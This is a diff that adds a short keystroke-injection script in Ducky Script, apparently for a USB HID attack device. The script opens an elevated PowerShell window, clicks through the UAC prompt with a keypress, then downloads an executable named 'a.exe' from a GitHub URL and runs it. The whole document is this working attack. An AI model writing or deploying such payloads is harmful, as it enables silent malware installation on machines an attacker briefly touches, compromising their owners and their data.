@@ -1,0 +1,14 @@
+REM start of script
+REM
+REM let the HID enumerate
+DELAY 2000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 3000
+STRING $down = New-Object System.Net.Webclient; $url = 'https://github.com/Kyrd0x/furdz/bin/a.exe'; $file = 'a.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER	
